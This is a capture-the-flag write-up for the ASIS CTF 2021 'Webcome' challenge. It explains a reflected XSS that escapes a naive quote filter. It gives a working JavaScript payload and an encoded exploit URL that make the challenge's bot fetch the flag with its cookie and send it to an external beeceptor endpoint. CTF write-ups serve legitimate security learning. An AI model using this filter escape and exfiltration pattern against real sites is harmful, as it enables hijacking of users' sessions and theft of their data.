# Webcome

## Description  
Welcome! I made a [website](http://65.21.255.24:5000/).

Download the source code from
[here](https://asisctf.com/tasks/welcome_697082013f8f7b6f0ed025f77272fc65082eb3dc.txz).

## Writeup

In this challenge, the goal is to visit `/flag` route with a  
secret cookie after solving a captcha. The website also has a `/report` path,
which you can make the server visit a website in the backend. Analyzing the
code, we encountered some interesting parts in the homepage code:

```javascript  
app.get('/',(req,res)=>{  
	var msg = req.query.msg  
	if(!msg) msg = `Yo you want the flag? solve the captcha and click submit.\\nbtw you can't have the flag if you don't have the secret cookie!`  
	msg = msg.toString().toLowerCase().replace(/\'/g,'\\\'').replace('/script','\\/script')  
	res.send(indexHtml.replace('$MSG$',msg))  
})  
```  
In case a query parameter exists, after some naive sanitization, it is
replaced in place of `$MSG$` in the `index.html` file:  
```html  
<script>  
   msg.innerText = '$MSG$';  
</script>  
```  
So our initial guess is to perform some XSS attack.

### Failed Attempts  
1. First, we tried to somehow gain access to the secret cookie, which is set with the following code:  
```javascript  
await page.setCookie({  
		name: 'secret_token',  
		value: secretToken,  
		domain: challDomain,  
		httpOnly: true,  
		secret: false,  
		sameSite: 'Lax'  
	})  
```  
But the security niceties are well observed, and it seems like it is not
possible to get the cookie maliciously.

Especially, `httpOnly` prevents JavaScript from accessing this token, and
hence, we cannot use simple `document.cookie` XSS.

1. We encountered this line in the code:  
```javascript  
app.use(bodyParser.urlencoded({ extended: true }));  
```  
That simply allows the user to pass advanced formatted queries, which may help
bypass some security measurements if not applied cautiously. But we could not
get much use of it. (We were thinking of ways to somehow bypass `msg` query
sanitizations, or even manipulate the captcha verification process by crafting
a special value for `g-recaptcha-response`, which gets passed to the `/flag`
path is used to authenticate the solved captcha).

### Solution  
Our solution was to craft a specific url that contains a script which makes
the backend browser (that has the secret cookie) to visit the `/flag` path and
sending the flag to our endpoint API, but first we had to bypass the captcha.

#### Bypassing ReCaptcha  
We first tried to reconstruct the captcha on our end by getting its required
parameters from the backend server. After some investigation it turned out to
be too advanced so we dumped the idea.

Our final workaround was to solve a captcha on our end and capture its
`g-recaptcha-response` before reaching the server and send it to our script,
hoping it would work, which it turned out to do :))

The script that we used was the following:  
```javascript  
headers = {method: "GET"};  
let data = "g-recaptcha-response=";  
fetch(url = `https://larmol.free.beeceptor.com/`, headers =
headers).then(async response => {  
   let t = await response.text();  
   data = data.concat(t);  
   headers = {  
       method: "POST",  
       body: data,  
       headers: {"Content-Type": "application/x-www-form-urlencoded"},  
       credentials: "include"  
   };  
   fetch(url = `http://65.21.255.24:5000/flag`, headers).then(async response
=> {  
       headers = {method: "GET"};  
       let t = await response.text();  
       fetch(url = `https://larmol.free.beeceptor.com/${t}`, headers)  
   });  
});  
```  
This script does the following steps:

1. Gets the `g-recaptcha-response` from an endpoint that we created, providing it with our solved captcha.  
2. Creates a request containing the `g-recaptcha-response` parameter and sends it to the `/flag` route, obtaining the flag.  
3. Sends the flag to our endpoint in the URL (we could have sent it way better, but we were too tired ^__^)

We needed to encode our script in the URL. Our final crafted URL was this:  
```  
http://65.21.255.24:5000/?msg=%5C';headers=%7Bmethod:%22GET%22%7D;let%20data%20=%20%22g-recaptcha-
response=%22;fetch(url=%60https://larmol.free.beeceptor.com/%60,%20headers=headers).then(async%20response%20=%3E%20%7Blet%20t=await%20response.text();data%20=%20data.concat(t);headers%20=%20%7Bmethod:%22POST%22,body:%20data,headers:%20%7B%22Content-
Type%22:%20%22application/x-www-form-
urlencoded%22%7D,credentials:%20%22include%22%7D;fetch(url=%60http://65.21.255.24:5000/flag%60,%20headers).then(async%20response%20=%3E%20%7Bheaders=%7Bmethod:%22GET%22%7D;let%20t%20=%20await%20response.text();fetch(url=%60https://larmol.free.beeceptor.com/$%7Bt%7D%60,%20headers)%7D);%7D);//  
```

We had to add `\\';` and `//` to the beginning and end of our query,
respectively, to escape from the naive filtering mentioned and get our script
out of the `'$MSG$'` quotes to get it running.

Submitting the URL, we get the flag on our endpoint:  
```  
ASIS{welcomeeeeee-to-asisctf-and-merry-christmas}  
```  

Original writeup (https://github.com/titansarus/ASIS-CTF-
Final-2021/tree/main/Webcome).